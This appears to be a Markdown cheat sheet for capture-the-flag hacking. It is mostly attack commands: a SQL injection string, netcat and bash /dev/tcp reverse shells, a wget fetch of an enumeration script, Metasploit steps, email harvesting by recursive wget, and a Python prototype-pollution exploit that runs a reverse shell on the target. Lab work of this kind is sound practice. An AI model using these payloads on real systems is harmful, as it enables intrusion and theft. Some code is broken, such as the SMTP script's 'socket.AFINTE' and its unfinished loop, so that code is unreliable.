# CTF Reference

### Native tools
- [Lin Enum](https://github.com/rebootuser/LinEnum)
- [RustScan](https://github.com/RustScan/RustScan)
- [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)

### Online tools
- [Crypto Chef](https://gchq.github.io/CyberChef/)

 
### Sudo basic escalation
```
sudo -l
sudo -u theuser <app>
```

### Basic SQL injection
```
' OR name='test';--
```

### Quick Python HTTP server
Will serve any file in directory
```shell
python -m SimpleHTTPServer 8000
```
To fetch from the remote machine
```shell
wget http://<ip>:8000/LinEnum.sh
```

### nc reverse shell
Listener
```
nc -nlvp 444
```
Client
```
/bin/sh | nc <ip> 444
# or
bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
```
### nmap
```shell
nmap -sC -A -T4 <ip>
```

### dirb
```shell
dirb <url> /usr/share/wordlists/dirb/common.txt
```

### Metasploit basic usage
```shell
msfconsole
search <name>
use <id>
show options
set rhosts <ip>
set targeturi /cgi-bin/hello.cgi
run
```

### Basic banner grabbing (Python)
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.198.73.23", 23))

print s.recv(1024)
```

### Recursive wget 
```shell
wget -r --level=1 -p http://<website> 
find . -name "*" -exec cat {} \; | grep "@email.com" # find strings in downloaded sites
```

### Protoype pollution AST injection
- [Nodejs AST injection](https://blog.p6.is/AST-Injection/)

```python
import requests

TARGET_URL = 'http://10.10.12.14:8713'

requests.post(TARGET_URL + '/submit', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/10.10.12.14/6666 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

print()

# execute
requests.get(TARGET_URL)
```

### Basic SMTP enum (Python)

```python
import socket
f = open("userlist", "r")
users = f.readlines()

for user in users:
    s = socket.socket(socket.AFINTE)

    s.connect(("mail.baldrinc.com", 25))
    s.recv(1024)
    s.send("HELO")
    #...
    
# 546d467562334a356558493d
```
